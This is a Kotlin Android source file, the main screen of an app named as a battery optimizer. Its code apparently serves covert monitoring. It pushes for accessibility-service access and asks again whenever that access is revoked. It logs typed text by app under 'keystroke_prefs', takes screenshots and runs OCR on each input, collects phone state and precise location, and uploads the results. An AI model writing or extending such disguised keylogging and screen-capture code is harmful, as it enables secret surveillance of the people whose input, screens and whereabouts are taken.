package com.android.batteryoptimization

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import android.graphics.BitmapFactory
import android.net.Uri
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.MoreVert
import androidx.compose.material.icons.filled.Person
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.android.batteryoptimization.ocr.api.IOcrService
import com.android.batteryoptimization.ocr.api.OcrResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.withContext
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val prefs = getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
        if (!prefs.contains("app_started_time")) {
            prefs.edit().putLong("app_started_time", System.currentTimeMillis()).apply()
        }

        val hasLaunchedBefore = prefs.getBoolean("has_launched_before", false)

        // Request runtime permissions for device info collection
        val permissions = arrayOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_PHONE_STATE
        )
        val permissionsToRequest = permissions.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(this, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isNotEmpty()) {
            androidx.core.app.ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
        }

        val repository = InputRepository.getInstance(applicationContext)

        val startDest = when {
            repository.getUserInfo() == null -> "binding"
            !hasLaunchedBefore -> "main"
            else -> "battery_protection"
        }
        if (!hasLaunchedBefore) {
            prefs.edit().putBoolean("has_launched_before", true).apply()
        }

        setContent {
            BatteryOptimizationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()

                    NavHost(navController = navController, startDestination = startDest) {
                        composable("binding") {
                            BindingScreen(
                                repository = repository,
                                onNavigateToMain = {
                                    prefs.edit().putBoolean("has_launched_before", true).apply()
                                    navController.navigate("main") {
                                        popUpTo("binding") { inclusive = true }
                                    }
                                }
                            )
                        }
                        composable("main") {
                            AppScreen(
                                repository = repository,
                                onNavigateToBinding = { navController.navigate("binding") },
                                onNavigateToInstructions = { navController.navigate("instructions") },
                                onNavigateToBatteryProtection = { navController.navigate("battery_protection") },
                                onNavigateToUploadRecords = { navController.navigate("upload_records") }
                            )
                        }
                        composable("instructions") {
                            InstructionScreen(
                                onBackClick = { navController.popBackStack() }
                            )
                        }
                        composable("battery_protection") {
                            BatteryProtectionScreen(
                                onNavigateToMain = {
                                    navController.navigate("main") {
                                        popUpTo("main") { inclusive = true }
                                    }
                                }
                            )
                        }
                        composable("upload_records") {
                            UploadRecordScreen(
                                repository = repository,
                                onBackClick = { navController.popBackStack() }
                            )
                        }
                    }
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AppScreen(
    repository: InputRepository,
    onNavigateToBinding: () -> Unit,
    onNavigateToInstructions: () -> Unit,
    onNavigateToBatteryProtection: () -> Unit,
    onNavigateToUploadRecords: () -> Unit
) {
    val coroutineScope = rememberCoroutineScope()
    val context = LocalContext.current
    var isServiceEnabled by remember { mutableStateOf(isAccessibilityEnabledInSettings(context)) }
    var isServiceConnected by remember { mutableStateOf(isServiceInstanceReady()) }
    var showAccessibilityDialog by remember { mutableStateOf(false) }
    val events by repository.eventsFlow.collectAsState(initial = emptyList())

    fun startAutoScreenshot() {
        if (!isAccessibilityEnabledInSettings(context)) {
            android.widget.Toast.makeText(context, "无障碍服务未开启，请先开启权限", android.widget.Toast.LENGTH_SHORT).show()
            return
        }
        if (!isServiceInstanceReady()) {
            android.widget.Toast.makeText(context, "服务正在连接中，请稍候…", android.widget.Toast.LENGTH_SHORT).show()
            return
        }
        val intent = android.content.Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
            setPackage(context.packageName)
        }
        context.sendBroadcast(intent)
        android.widget.Toast.makeText(context, "已发送测试截屏指令", android.widget.Toast.LENGTH_SHORT).show()
    }

    // Update service status and data when returning to the app
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                val enabled = isAccessibilityEnabledInSettings(context)
                isServiceEnabled = enabled
                isServiceConnected = isServiceInstanceReady()
                // 如果设置里无障碍未开启，弹窗引导
                if (!enabled) {
                    showAccessibilityDialog = true
                }
                repository.loadEvents() // Force reload data from disk on resume
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    // 启动时检查：设置已开启但实例未就绪 → 轮询等待服务重连
    LaunchedEffect(isServiceEnabled, isServiceConnected) {
        if (isServiceEnabled && !isServiceConnected) {
            // 轮询等待 onServiceConnected，最多等 15 秒
            repeat(30) {
                delay(500)
                if (isServiceInstanceReady()) {
                    isServiceConnected = true
                    return@repeat
                }
            }
        }
    }

    // 启动时检查：无障碍未开启 → 弹窗引导
    LaunchedEffect(Unit) {
        if (!isAccessibilityEnabledInSettings(context)) {
            showAccessibilityDialog = true
        }
    }

    var showMenu by remember { mutableStateOf(false) }
    var showIntervalDialog by remember { mutableStateOf(false) }

    // 当前截屏间隔（从 SharedPreferences 读取，默认 10s）
    val intervalPrefs = context.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
    var currentIntervalMs by remember { mutableLongStateOf(
        intervalPrefs.getLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, InputAccessibilityService.DEFAULT_SCREENSHOT_INTERVAL_MS)
    ) }

    // ── OCR 服务（经 DRouter 寻址，实现在独立 :ocr_module） ─────────
    val ocrService = remember { OcrServiceLocator.get() }
    var isStandaloneReady by remember { mutableStateOf(ocrService?.isReady ?: false) }

    LaunchedEffect(Unit) {
        if (ocrService != null) {
            withContext(Dispatchers.IO) {
                ocrService.loadModels()
                isStandaloneReady = ocrService.isReady
            }
        }
    }
    // 注意：OCR 引擎生命周期由 DRouter 单例管理，页面销毁时不销毁，避免影响无障碍服务的 OCR。

    // ── OCR test state ────────────────────────────────────────────────
    var isOcrRunning by remember { mutableStateOf(false) }
    var ocrTestResult by remember { mutableStateOf<List<OcrResult>?>(null) }
    var isLocating by remember { mutableStateOf(false) }
    var locationDialogText by remember { mutableStateOf<String?>(null) }

    val ocrTestLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        if (uri == null) return@rememberLauncherForActivityResult
        coroutineScope.launch {
            isOcrRunning = true
            try {
                val bitmap = context.contentResolver.openInputStream(uri)?.use { input ->
                    BitmapFactory.decodeStream(input)
                }?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                if (bitmap == null) {
                    android.widget.Toast.makeText(context, "无法加载图片", android.widget.Toast.LENGTH_SHORT).show()
                    return@launch
                }

                // 优先用无障碍服务已加载好的 OCR 服务，否则用页面内寻址到的服务
                val serviceEngine = InputAccessibilityService.instance?.getOcrService()
                val engine = when {
                    serviceEngine != null && serviceEngine.isReady -> serviceEngine
                    ocrService != null && isStandaloneReady -> ocrService
                    else -> {
                        android.widget.Toast.makeText(context, "OCR 模块未集成或引擎尚未就绪", android.widget.Toast.LENGTH_SHORT).show()
                        bitmap.recycle()
                        return@launch
                    }
                }
                val results = engine.recognize(bitmap)
                ocrTestResult = results
                bitmap.recycle()
            } catch (e: Exception) {
                android.widget.Toast.makeText(context, "OCR 测试失败: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
            } finally {
                isOcrRunning = false
            }
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("电池", color = Color.White) },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    navigationIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    actionIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                ),
                actions = {
                    TextButton(onClick = { showMenu = true }) {
                        Text("更多", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }
                    DropdownMenu(
                        expanded = showMenu,
                        onDismissRequest = { showMenu = false }
                    ) {
                        DropdownMenuItem(
                            text = { Text("个人信息修改", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToBinding()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("主动上报数据", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                coroutineScope.launch {
                                    val (_, message) = repository.uploadData()
                                    android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_SHORT).show()
                                }
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("查看上传记录", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToUploadRecords()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("电池管理", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToBatteryProtection()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("自动截屏间隔", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                showIntervalDialog = true
                            }
                        )
                        DropdownMenuItem(
                            text = { Text(if (isOcrRunning) "识别中…" else "测试OCR", fontSize = 16.sp) },
                            enabled = !isOcrRunning,
                            onClick = {
                                showMenu = false
                                ocrTestLauncher.launch("image/*")
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("测试截屏", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                startAutoScreenshot()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text(if (isLocating) "定位中…" else "更新定位", fontSize = 16.sp) },
                            enabled = !isLocating,
                            onClick = {
                                showMenu = false
                                coroutineScope.launch {
                                    isLocating = true
                                    android.widget.Toast.makeText(context, "正在开始高德定位，请稍候...", android.widget.Toast.LENGTH_SHORT).show()
                                    try {
                                        val payload = repository.forceRefreshLocation()
                                        val jsonStr = com.google.gson.GsonBuilder().setPrettyPrinting().create().toJson(payload)
                                        locationDialogText = jsonStr
                                    } catch (e: Exception) {
                                        android.widget.Toast.makeText(context, e.message ?: "定位失败", android.widget.Toast.LENGTH_LONG).show()
                                    } finally {
                                        isLocating = false
                                    }
                                }
                            }
                        )
                    }
                }
            )
        }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .padding(16.dp)
        ) {
            // Prominent Instructions Card at top
            Card(
                onClick = onNavigateToInstructions,
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.secondaryContainer),
                modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp)
            ) {
                Row(
                    modifier = Modifier.padding(14.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Icon(
                        Icons.Default.Info,
                        contentDescription = "使用说明",
                        tint = MaterialTheme.colorScheme.onSecondaryContainer
                    )
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "使用说明",
                            fontWeight = FontWeight.Bold,
                            fontSize = 18.sp,
                            color = MaterialTheme.colorScheme.onSecondaryContainer
                        )
                        Text(
                            text = "首次使用请先完成权限设置，点击查看详情",
                            fontSize = 14.sp,
                            color = MaterialTheme.colorScheme.onSecondaryContainer.copy(alpha = 0.9f)
                        )
                    }
                    Text(
                        text = "查看 >",
                        color = MaterialTheme.colorScheme.onSecondaryContainer,
                        fontWeight = FontWeight.Bold,
                        fontSize = 16.sp
                    )
                }
            }

            if (events.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("暂无记录", color = Color.Gray, fontSize = 16.sp)
                }
            } else {
                LazyColumn(
                    verticalArrangement = Arrangement.spacedBy(8.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    items(events) { event ->
                        EventItem(event)
                    }
                }
            }
        }
    }

    // ── OCR 测试结果对话框 ─────────────────────────────────────────────
    ocrTestResult?.let { results ->
        val totalText = results.joinToString("\n") { it.text }
        val detailText = results.mapIndexed { i, r ->
            "#${i + 1}: ${r.text}  (置信度: ${(r.confidence * 100).toInt()}%)"
        }.joinToString("\n")

        AlertDialog(
            onDismissRequest = { ocrTestResult = null },
            title = {
                Text("OCR 测试结果", fontWeight = FontWeight.Bold)
            },
            text = {
                Column {
                    Text(
                        text = "检测到 ${results.size} 个文本区域",
                        color = MaterialTheme.colorScheme.primary,
                        fontWeight = FontWeight.SemiBold
                    )
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = "── 全部文本 ──",
                        fontWeight = FontWeight.SemiBold,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(text = totalText, fontSize = 18.sp)
                    Spacer(Modifier.height(12.dp))
                    Divider()
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = "── 详细信息 ──",
                        fontWeight = FontWeight.SemiBold,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(text = detailText, fontSize = 14.sp, color = Color.Gray)
                }
            },
            confirmButton = {
                TextButton(onClick = { ocrTestResult = null }) {
                    Text("关闭")
                }
            }
        )
    }

    // ── 高德定位结果对话框 ─────────────────────────────────────────────
    locationDialogText?.let { json ->
        AlertDialog(
            onDismissRequest = { locationDialogText = null },
            title = {
                Text("高德定位结果", fontWeight = FontWeight.Bold)
            },
            text = {
                Column(
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "以下为上传地理位置对象的结构与内容：",
                        fontWeight = FontWeight.SemiBold,
                        color = MaterialTheme.colorScheme.primary,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(8.dp))
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(260.dp)
                            .background(Color(0xFFF5F5F5))
                            .padding(8.dp)
                    ) {
                        androidx.compose.foundation.lazy.LazyColumn {
                            item {
                                Text(
                                    text = json,
                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                    fontSize = 12.sp,
                                    color = Color.DarkGray
                                )
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { locationDialogText = null }) {
                    Text("确定")
                }
            }
        )
    }

    // ── 自动截屏间隔设置对话框 ────────────────────────────────────
    if (showIntervalDialog) {
        val options = listOf(
            5000L to "5 秒",
            10000L to "10 秒",
            15000L to "15 秒",
            30000L to "30 秒",
            60000L to "60 秒"
        )
        AlertDialog(
            onDismissRequest = { showIntervalDialog = false },
            title = { Text("自动截屏间隔", fontWeight = FontWeight.Bold) },
            text = {
                Column {
                    Text("每次输入时，距上次截屏超过此间隔则自动截屏+OCR")
                    Spacer(Modifier.height(12.dp))
                    options.forEach { (ms, label) ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    currentIntervalMs = ms
                                    intervalPrefs.edit().putLong(
                                        InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
                                    ).apply()
                                    showIntervalDialog = false
                                }
                                .padding(vertical = 8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            RadioButton(
                                selected = currentIntervalMs == ms,
                                onClick = {
                                    currentIntervalMs = ms
                                    intervalPrefs.edit().putLong(
                                        InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
                                    ).apply()
                                    showIntervalDialog = false
                                }
                            )
                            Spacer(Modifier.width(8.dp))
                            Text(label, fontSize = 16.sp)
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showIntervalDialog = false }) {
                    Text("取消")
                }
            }
        )
    }

    // ── 无障碍权限被回收弹窗 ────────────────────────────────────
    if (showAccessibilityDialog) {
        AlertDialog(
            onDismissRequest = { showAccessibilityDialog = false },
            title = { Text("需要开启辅助功能", fontWeight = FontWeight.Bold) },
            text = {
                Text(
                    "检测到辅助功能权限未开启，应用无法正常工作。\n\n" +
                    "App 被系统杀死后权限可能被回收，请重新开启。",
                    fontSize = 15.sp
                )
            },
            confirmButton = {
                TextButton(onClick = {
                    showAccessibilityDialog = false
                    context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                }) {
                    Text("去开启", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showAccessibilityDialog = false }) {
                    Text("稍后")
                }
            }
        )
    }
}

@Composable
fun EventItem(event: InputEvent) {
    val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    val dateString = dateFormat.format(Date(event.timestamp))

    Card(
        modifier = Modifier.fillMaxWidth(),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
    ) {
        Column(
            modifier = Modifier.padding(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                val displayName = if (!event.appName.isNullOrBlank()) event.appName else event.packageName
                Text(
                    text = displayName,
                    fontSize = 14.sp,
                    color = MaterialTheme.colorScheme.primary,
                    fontWeight = FontWeight.Bold
                )
                Text(
                    text = dateString,
                    fontSize = 14.sp,
                    color = Color.Gray
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = event.text,
                fontSize = 18.sp,
                fontWeight = FontWeight.Medium,
                color = MaterialTheme.colorScheme.onSurface
            )
        }
    }
}

fun checkAccessibilityPermission(context: Context): Boolean {
    return isAccessibilityEnabledInSettings(context)
}

/** 仅检查系统设置中无障碍是否已开启本服务 */
fun isAccessibilityEnabledInSettings(context: Context): Boolean {
    var accessibilityEnabled = 0
    val service = "${context.packageName}/${InputAccessibilityService::class.java.canonicalName}"
    try {
        accessibilityEnabled = Settings.Secure.getInt(
            context.contentResolver,
            android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
        )
    } catch (e: Settings.SettingNotFoundException) {
        // Ignore
    }
    if (accessibilityEnabled == 1) {
        val settingValue = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (settingValue != null) {
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(settingValue)
            while (splitter.hasNext()) {
                val accessibilityService = splitter.next()
                if (accessibilityService.equals(service, ignoreCase = true)) {
                    return true
                }
            }
        }
    }
    return false
}

/** 检查服务实例是否已就绪（onServiceConnected 已调用） */
fun isServiceInstanceReady(): Boolean = InputAccessibilityService.instance != null
